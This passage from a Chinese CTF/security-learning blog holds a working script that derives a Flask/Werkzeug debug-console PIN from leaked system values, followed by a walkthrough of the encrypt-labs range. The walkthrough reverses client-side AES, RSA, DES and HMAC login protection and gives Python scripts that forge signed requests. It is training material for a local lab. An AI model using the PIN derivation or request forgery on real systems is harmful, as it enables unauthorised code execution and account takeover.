class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import chain</span><br><span class="line"></span><br><span class="line"># 可能是公开的信息部分</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    &#x27;root&#x27;,  # /etc/passwd</span><br><span class="line">    &#x27;flask.app&#x27;,  # 默认值</span><br><span class="line">    &#x27;Flask&#x27;,  # 默认值</span><br><span class="line">    &#x27;/home/ctf/app/app.py&#x27;  # moddir，报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 私有信息部分</span><br><span class="line">private_bits = [</span><br><span class="line">    &#x27;42362379744178&#x27;,  # /sys/class/net/eth0/address 十进制</span><br><span class="line">    &#x27;89b34b88-6f33-4c4b-8a30-69a4ba41fd0e&#x27;</span><br><span class="line">    # machine-id部分</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 创建哈希对象</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"></span><br><span class="line"># 迭代可能公开和私有的信息进行哈希计算</span><br><span class="line">for bit in chain(probably_public_bits, private_bits):</span><br><span class="line">    if not bit:</span><br><span class="line">        continue</span><br><span class="line">    if isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(&#x27;utf-8&#x27;)</span><br><span class="line">    h.update(bit)</span><br><span class="line"></span><br><span class="line"># 加盐处理</span><br><span class="line">h.update(b&#x27;cookiesalt&#x27;)</span><br><span class="line"></span><br><span class="line"># 生成 cookie 名称</span><br><span class="line">cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]</span><br><span class="line">print(cookie_name)</span><br><span class="line"></span><br><span class="line"># 生成 pin 码</span><br><span class="line">num = None</span><br><span class="line">if num is None:</span><br><span class="line">    h.update(b&#x27;pinsalt&#x27;)</span><br><span class="line">    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]</span><br><span class="line"></span><br><span class="line"># 格式化 pin 码</span><br><span class="line">rv = None</span><br><span class="line">if rv is None:</span><br><span class="line">    for group_size in 5, 4, 3:</span><br><span class="line">        if len(num) % group_size == 0:</span><br><span class="line">            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)</span><br><span class="line">                          for x in range(0, len(num), group_size))</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>获取了pin码，下一步就是获取cookie，就直接贴官p了</p><p><a href="https://mp.weixin.qq.com/s/VZSk9KRRv7gZ25EXD1AlZQ">微信公众平台</a></p>]]></content>
      
      
      <categories>
          
          <category> 重生我要当web糕手 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>重生我要当web糕手之js逆向基础</title>
      <link href="/posts/55713.html"/>
      <url>/posts/55713.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目前大量的测试的站点当中发现很大部分使用了加密，刚好a1佬也给讲了这一部分</span><br><span class="line">于是做一做encrypt-labs靶场，加强学习一下，不涉及混淆以及jsrpc部分</span><br></pre></td></tr></table></figure><p>靶场：<a href="https://github.com/SwagXz/encrypt-labs">https://github.com/SwagXz/encrypt-labs</a></p><p>butt3rf1y姐姐的wp：<a href="https://buutt3rf1y.github.io/2025/05/27/JS-%E9%80%86%E5%90%91%E4%B9%8B-encrypt-labs/#%E5%89%8D%E8%A8%80">(｡･ω･｡)泥嚎</a></p><p>还学习了靶场师傅推荐的文章就不引用了，可以去上面GitHub链接查看。</p><h1 id="js逆向"><a href="#js逆向" class="headerlink" title="js逆向"></a>js逆向</h1><h2 id="AES-固定-key"><a href="#AES-固定-key" class="headerlink" title="AES 固定 key"></a>AES 固定 key</h2><p><img src="/../images/image-20251105144235805.png" alt="image-20251105144235805"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">定位其aes代码</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105150619559.png" alt="image-20251105150619559"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给了key，iv放到插件上解密就好了</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105151127208.png" alt="image-20251105151127208"></p><h2 id="AES-服务端获取-Key"><a href="#AES-服务端获取-Key" class="headerlink" title="AES 服务端获取 Key"></a>AES 服务端获取 Key</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">会有两个请求的数据包，第一个是返回aes_key,iv。第二个是请求的加密的登录请求</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105190819363.png" alt="image-20251105190819363"></p><p><img src="/../images/image-20251105190836855.png" alt="image-20251105190836855"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">定位到js代码，尝试多请求几次，发现服务端的key，iv没有改变，跟上面意一样解密构造就好了</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105191125444.png" alt="image-20251105191125444"></p><p><img src="/../images/image-20251105191310879.png" alt="image-20251105191310879"></p><p><img src="/../images/image-20251105191348394.png" alt="image-20251105191348394"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将password改成123456即可显示true</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105191431329.png" alt="image-20251105191431329"></p><h2 id="RSA-加密"><a href="#RSA-加密" class="headerlink" title="RSA 加密"></a>RSA 加密</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">js代码定位到publickey</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105191609242.png" alt="image-20251105191609242"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">因为只获得了公钥，所以只能加密</span><br><span class="line"></span><br><span class="line">拿着公钥去构造&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;&#125;的请求数据</span><br><span class="line">实际上只拿到公钥，不知道数据体的结构操作性不大</span><br></pre></td></tr></table></figure><h2 id="AES-RSA-加密"><a href="#AES-RSA-加密" class="headerlink" title="AES + RSA 加密"></a>AES + RSA 加密</h2><p><img src="/../images/image-20251105193436178.png" alt="image-20251105193436178"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">定位到相应的js代码</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105193659550.png" alt="image-20251105193659550"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">但加密使用的key和iv是16位随机数，得到encryptedData</span><br><span class="line">然后对key和iv进行rsa加密</span><br><span class="line">得到encryptedKey和 encryptedIv将随机 16 位的key和iv进行固定</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const key = CryptoJS.enc.Utf8.parse(&quot;1234567890123456&quot;);</span><br><span class="line">const iv = CryptoJS.enc.Utf8.parse(&quot;1234567890123456&quot;);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105194020985.png" alt="image-20251105194020985"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后重新请求，经过几次登录发现 encryptedData 不会变，但 Key 和 Iv 会改变，说明修改成功了</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105194420962.png" alt="image-20251105194420962"></p><p><img src="/../images/image-20251105194602318.png" alt="image-20251105194602318"></p><h2 id="Des-规律-Key"><a href="#Des-规律-Key" class="headerlink" title="Des 规律 Key"></a>Des 规律 Key</h2><p><img src="/../images/image-20251105195123740.png" alt="image-20251105195123740"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">简单的DES加密，key和iv都使用了username的值，key是 8 位，</span><br><span class="line">如果username不满 8 位则用 6 补满，iv是 8 位，9999 + username的前四位，输入admi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key：admin666</span><br><span class="line">iv：9999admi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105195228696.png" alt="image-20251105195228696"></p><p><img src="/../images/image-20251105195328293.png" alt="image-20251105195328293"></p><h2 id="明文加签"><a href="#明文加签" class="headerlink" title="明文加签"></a>明文加签</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sendDataWithNonce</span>(<span class="params">url</span>) &#123;</span><br><span class="line"><span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">.<span class="property">value</span>;</span><br><span class="line"><span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">.<span class="property">value</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> nonce = <span class="title class_">Math</span>.<span class="title function_">random</span>()</span><br><span class="line">.<span class="title function_">toString</span>(<span class="number">36</span>)</span><br><span class="line">.<span class="title function_">substring</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">const</span> timestamp = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() / <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secretKey = <span class="string">&quot;be56e057f20f883e&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dataToSign = username + password + nonce + timestamp;</span><br><span class="line"><span class="keyword">const</span> signature = <span class="title class_">CryptoJS</span>.<span class="title class_">HmacSHA256</span>(dataToSign, secretKey)</span><br><span class="line">.<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fetch</span>(url, &#123;</span><br><span class="line"><span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line"><span class="attr">headers</span>: &#123;</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line"><span class="attr">username</span>: username,</span><br><span class="line"><span class="attr">password</span>: password,</span><br><span class="line"><span class="attr">nonce</span>: nonce,</span><br><span class="line"><span class="attr">timestamp</span>: timestamp,</span><br><span class="line"><span class="attr">signature</span>: signature</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (data.<span class="property">success</span>) &#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;登录成功&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;success.html&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_">alert</span>(data.<span class="property">error</span> || <span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;请求错误:&quot;</span>, error));</span><br><span class="line"></span><br><span class="line"><span class="title function_">closeModal</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插件bug密钥有英文不行，等1.08就好了吧应该，康康butt3rf1y姐姐的脚本</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105201526093-1762351835148-1.png" alt="image-20251105201526093"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/enjs/encrypt/signdata.php&quot;</span></span><br><span class="line">secret_key = <span class="string">&quot;be56e057f20f883e&quot;</span></span><br><span class="line">username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_nonce</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(<span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_signature</span>(<span class="params">username, password, nonce, timestamp, key</span>):</span><br><span class="line">    data_to_sign = username + password + nonce + <span class="built_in">str</span>(timestamp)</span><br><span class="line">    <span class="keyword">return</span> hmac.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), data_to_sign.encode(<span class="string">&#x27;utf-8&#x27;</span>), hashlib.sha256).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_signed_request</span>():</span><br><span class="line">    nonce = generate_nonce()</span><br><span class="line">    timestamp = <span class="built_in">int</span>(time.time())</span><br><span class="line">    signature = generate_signature(username, password, nonce, timestamp, secret_key)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://127.0.0.1/enjs/encrypt/signdata.php&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: nonce,</span><br><span class="line">        <span class="string">&quot;timestamp&quot;</span>: timestamp,</span><br><span class="line">        <span class="string">&quot;signature&quot;</span>: signature</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, json=payload, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Status Code:&quot;</span>, response.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Response Headers:&quot;</span>)</span><br><span class="line">    pprint.pprint(<span class="built_in">dict</span>(response.headers))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    send_signed_request()</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105202408743.png" alt="image-20251105202408743"></p><h2 id="加签-key-在服务端"><a href="#加签-key-在服务端" class="headerlink" title="加签 key 在服务端"></a>加签 key 在服务端</h2><p><img src="/../images/image-20251105202522550.png" alt="image-20251105202522550"></p><p><img src="/../images/image-20251105202616573.png" alt="image-20251105202616573"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在服务端获取签名之后和username，password，timestamp 进行签名再登录</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105202755670.png" alt="image-20251105202755670"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为加解密都在服务器端完成所以无法伪造</span><br><span class="line">如果要做密码爆破操作的话，写个脚本，将第一个包获得的sign，再去爆破应该也可以</span><br></pre></td></tr></table></figure><h2 id="禁止重放"><a href="#禁止重放" class="headerlink" title="禁止重放"></a>禁止重放</h2><p><img src="/../images/image-20251105202955511.png" alt="image-20251105202955511"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">generateRequestData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">const</span> timestamp = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> publicKey = <span class="string">`-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span></span><br><span class="line"><span class="string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span></span><br><span class="line"><span class="string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span></span><br><span class="line"><span class="string">ocDbsNeCwNpRxwjIdQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">rsaEncrypt</span>(<span class="params">data, publicKey</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> jsEncrypt = <span class="keyword">new</span> <span class="title class_">JSEncrypt</span>(); </span><br><span class="line">        jsEncrypt.<span class="title function_">setPublicKey</span>(publicKey);</span><br><span class="line">        <span class="keyword">const</span> encrypted = jsEncrypt.<span class="title function_">encrypt</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">        <span class="keyword">if</span> (!encrypted) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;RSA encryption failed.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> encrypted;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Encrypt the timestamp</span></span><br><span class="line">    <span class="keyword">let</span> encryptedTimestamp;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        encryptedTimestamp = <span class="title function_">rsaEncrypt</span>(timestamp, publicKey);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Encryption error:&quot;</span>, error);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> dataToSend = &#123;</span><br><span class="line">        <span class="attr">username</span>: username,</span><br><span class="line">        <span class="attr">password</span>: password,</span><br><span class="line">        <span class="attr">random</span>: encryptedTimestamp <span class="comment">// Replace timestamp with encrypted version</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dataToSend;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251105203512246.png" alt="image-20251105203512246"></p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/enjs/encrypt/norepeater.php&quot;</span></span><br><span class="line">public_key = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span></span><br><span class="line"><span class="string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span></span><br><span class="line"><span class="string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span></span><br><span class="line"><span class="string">ocDbsNeCwNpRxwjIdQIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt</span>(<span class="params">data, public_key</span>):</span><br><span class="line">    key = RSA.import_key(public_key)</span><br><span class="line">    cipher = PKCS1_v1_5.new(key)</span><br><span class="line">    encrypted_data = cipher.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> b64encode(encrypted_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>():</span><br><span class="line">    ts = <span class="built_in">str</span>(<span class="built_in">int</span>(time.time() * <span class="number">1000</span>))</span><br><span class="line">    encrypted_ts = rsa_encrypt(ts, public_key)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;PHPSESSID=snuhsl9mkun6ftjd3481d3g5nd&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://127.0.0.1/enjs/encrypt/norepeater.php&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">        <span class="string">&quot;random&quot;</span>: encrypted_ts</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, headers=headers, 